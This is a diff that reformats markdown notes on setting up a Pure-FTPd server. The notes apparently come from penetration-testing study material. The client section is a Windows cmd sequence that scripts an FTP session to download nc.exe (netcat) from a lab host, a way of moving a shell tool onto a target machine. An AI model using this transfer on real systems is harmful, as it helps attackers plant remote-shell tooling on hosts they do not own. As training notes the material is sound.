@@ -1,11 +1,16 @@
-# pure-ftpd
-> Pure-FTPd is a free FTP Server with a strong focus on software security. It can be compiled and run on a variety of Unix-like computer operating systems including Linux, OpenBSD, NetBSD, FreeBSD, DragonFly BSD, Solaris, Tru64, Darwin, Irix and HP-UX. It has also been ported to Android.  
+# Pure-FTPd
 
-- - - -
+> Pure-FTPd is a free FTP Server with a strong focus on software security. It can be compiled and run on a variety of Unix-like computer operating systems including Linux, OpenBSD, NetBSD, FreeBSD, DragonFly BSD, Solaris, Tru64, Darwin, Irix and HP-UX. It has also been ported to Android.  
+>
+> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Pure-FTPd)</cite>
+
 ## Server
-`apt-get install pure-ftpd`
+```bash
+apt-get install pure-ftpd
+```
 
 ### Create user
+
 ```bash
 #!/bin/bash 
 groupadd ftpgroup
@@ -19,8 +24,8 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart 
 ```
 
-- - - -
 ## Client
+
 ```cmd
 echo open 10.11.0.5 21> ftp.txt
 echo USER offsec>> ftp.txt
@@ -30,5 +35,3 @@ echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt 
 ```
-
-- - - -
